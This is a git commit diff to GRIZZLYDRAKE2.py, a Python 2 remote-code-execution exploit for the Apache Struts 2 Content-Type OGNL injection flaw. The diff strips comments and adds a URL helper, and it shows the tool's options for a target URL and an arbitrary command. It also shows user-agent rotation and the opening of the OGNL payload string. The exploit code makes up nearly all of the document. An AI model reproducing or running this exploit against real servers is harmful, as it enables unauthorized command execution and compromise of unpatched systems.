fb1472c63d6736d48668317bfa7856973c055dd8
Name Redacted <0x64645f@gmail.com>
2017-03-26 16:50:59 -0400

    GRIZZLYDRAKE2 - Apache Structs 2 Exploit
    Automation is the next step, with a option to patch vulnerable server if permissions allow.

--- GRIZZLYDRAKE2.py
+++ GRIZZLYDRAKE2.py
@@ -1,39 +1,33 @@
 #!/usr/bin/env python2
 
-#import libs (try to cut down)
 import os
+import re
 import sys
 import base64
 import random
 import requests
 import optparse
 
-#SSL Warnings
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-#base64 encoded
 data00 = "ChtbOTJtCgogIF8gICAgICBfICAgICAgICAgXyAgICAgICAgICAgICAgICAgIF8gICAgICAgICBfICAgICAgICAgICAgXyAgICAgICAgICAgICBfICAgICAgCi9fL1wgICAgL1wgXCAgICAgLyAvXCAgICAgICAgICAgICAgICAvXCBcICAgICAgLyAvXCAgICAgICAgIC9cIFwgICAgICAgICAvXCBcICAgICAKXCBcIFwgICBcIFxfXCAgIC8gLyAgXCAgICAgICAgICAgICAgLyAgXCBcICAgIC8gLyAgXCAgICAgICAvICBcIFwgICAgICAgLyAgXCBcICAgIAogXCBcIFxfXy8gLyAvICAvIC8gL1wgXCAgICAgICAgICAgIC8gL1wgXCBcICAvIC8gL1wgXF9fICAgLyAvXCBcIFwgICAgIC8gL1wgXCBcICAgCiAgXCBcX18gXC9fLyAgLyAvIC9cIFwgXCAgICAgICAgICAvIC8gL1wgXF9cLyAvIC9cIFxfX19cIC8gLyAvXCBcX1wgICAvIC8gL1wgXCBcICAKICAgXC9fL1xfXy9cIC9fLyAvICBcIFwgXCAgICAgICAgLyAvXy9fIFwvXy9cIFwgXCBcL19fXy8vIC9fL18gXC9fLyAgLyAvIC8gIFwgXF9cIAogICAgXy9cL19fXCBcXCBcIFwgICBcIFwgXCAgICAgIC8gL19fX18vXCAgICBcIFwgXCAgICAgLyAvX19fXy9cICAgIC8gLyAvICAgIFwvXy8gCiAgIC8gXy9fL1wgXCBcXCBcIFwgICBcIFwgXCAgICAvIC9cX19fX1wvXyAgICBcIFwgXCAgIC8gL1xfX19fXC8gICAvIC8gLyAgICAgICAgICAKICAvIC8gLyAgIFwgXCBcXCBcIFxfX19cIFwgXCAgLyAvIC8gICAgIC9fL1xfXy8gLyAvICAvIC8gL19fX19fXyAgLyAvIC9fX19fX19fXyAgIAogLyAvIC8gICAgL18vIC8gXCBcL19fX19cIFwgXC8gLyAvICAgICAgXCBcL19fXy8gLyAgLyAvIC9fX19fX19fXC8gLyAvX19fX19fX19fXCAgCiBcL18vICAgICBcX1wvICAgXF9fX19fX19fX1wvXC9fLyAgICAgICAgXF9fX19fXC8gICBcL19fX19fX19fX18vXC9fX19fX19fX19fX18vICAKChtbMG0KG1s5MW0gICAgICAgICAgICAgICAgICAgICAgICBbQ1ZFOiAyMDE1LTU2MzggLSBBcGFjaGUgU3RydXRzIDJdChtbMG0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnk6IDB4NjQ2NDVmQGdtYWlsLmNvbQoK"
 data01 = "JXByb2cgLXUgVVJMIFstYyBDTURdCgpVc2FnZTogJXByb2cgLXUgJ2h0dHA6Ly92dWxuLm5ldCcKClVzYWdlOiAlcHJvZyAtdSAnaHR0cDovL3Z1bG4ubmV0JyAtYyAnaWZjb25maWcgLWEnCg=="
 
-#option parsing
 p = optparse.OptionParser(usage=base64.b64decode(data01))
 p.add_option('-u', '--url', action="store", default=None, dest="url", type="string", help="Target URL")
 p.add_option('-c', '--cmd', action="store", default=None, dest="cmd", type="string", help="RCE Command")
 p.add_option('-a', '--uaf', action="store", default=None, dest="uaf", type="string", help="Custom User-Agent File")
 (option, arg) = p.parse_args()
 
-#obtain options from parsing
 url = option.url if option.url else None
 cmd = option.cmd if option.cmd else 'id'
 uaf = option.uaf if option.uaf else 'user-agents.txt'
 
-#introduction title
 def intro():
 	print("")
 	print(base64.b64decode(data00))
 
-#random user-agent function
 def rand_ua(ua_file):
 	uaf=ua_file
 	if os.path.isfile(uaf):
@@ -42,8 +36,17 @@ def rand_ua(ua_file):
 	else:
 		return "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36"
 
-#struts2 exploit function
+def parse_url(url):
+    url = url.rstrip(":")
+    if not re.match("^(http|https)://", url):
+		url = "http://" + url
+    else:
+		url = url
+    return url
+
+
 def exploit(url, cmd):
+    url = parse_url(url)
     to = 15 #timeout in seconds
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -80,7 +83,6 @@ def exploit(url, cmd):
     return ret
     
 
-#actual start of file MAIN
 if __name__ == '__main__':
 	intro()
 	print("[*] Attempting to run `%s` on %s\n") % (cmd, url)
